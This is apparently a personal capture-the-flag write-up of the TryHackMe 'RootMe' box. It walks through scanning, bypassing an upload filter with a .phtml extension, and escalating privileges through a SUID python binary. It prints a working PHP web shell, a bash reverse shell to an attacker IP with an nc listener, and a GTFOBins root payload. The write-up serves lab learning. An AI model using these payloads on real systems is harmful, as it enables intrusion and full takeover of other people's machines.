* * *
 ### ROOTME box 
 ### Tryhackme
* * * 

### Reconnaissance
- I scanned and fingerprinted the services running on the target ip with nmap and it discovered two open ports.

  ![2023-12-25_03-30](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/10260022-8e5a-4527-b014-2c0c53d579d4)

- Nmap identified an apache web server running on port 80,I took the next step on the list which was fuzzzing for directories with gobuster.
Gobuster discovered two interesting directories "uploads" and "panel"

   ![2023-12-25_03-37](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ca20f790-7fa5-4c70-81c0-5c06a27ab19e)

- The "/panel/" directory contains a page for uploading file,I tested for unrestricted file upload by trying to upload a simple php shell.
I was unable to upload a file ending with ".php", I decided to try other php extensions and ".phtml" worked. Now we can execute shell commands and try to escalate privileges

     ![2023-12-25_03-41](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9371e7e6-b584-48dd-8bbb-5d11823ac0f0)

- I accessed the shell via the uploads directory, this is an example of a php shell,I got it from revshells.com
```
   <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
- To make things easier,i popped a rev shell with this payload on the shell and created a listener on the host machine with "nc -nlvp 9999"
```  
   bash -c "bash -i >& /dev/tcp/10.18.31.164/9999 0>&1"
```

  ![2023-12-25_03-50](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/115d93ed-244a-49e6-9536-66622f266363)

- I stabilized the shell with this commands
 ```
   python3 -c "import pty;pty.spawn('/bin/bash')"
   ctrl+z
   stty raw -echo;fg
   export TERM=XTERM
```
### Privesc
- The goal of the lab is to escalate privileges with SUID bit.SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file's owner. This means that even if a user does not have the necessary permissions to access or perform certain actions, they can do so by executing a file with the SUID permission
 I spotted binaries with SUID bits with this command and escalated privilege with /usr/bin/python
```
   find / -user root -perm /4000 2</dev/null
```
   ![2023-12-25_04-05](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/bc55bdb5-dcb1-4a9f-8c14-397ca4c66eb7)

- I checked gtfobins for payloads to escalate privileges with the python binary if SUID bit is set, and I got a payload.
```
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' 
```
- I escalated privileges with the payload

   ![2023-12-25_04-09](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e834fc16-f7af-4f2d-802b-00c76817eca2)

- Now I can read root.txt and user.txt and pwn the box,challenge solved.

   ![2023-12-25_04-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/396ee395-f030-4ec5-9337-845c7200b580)

   
  
- 
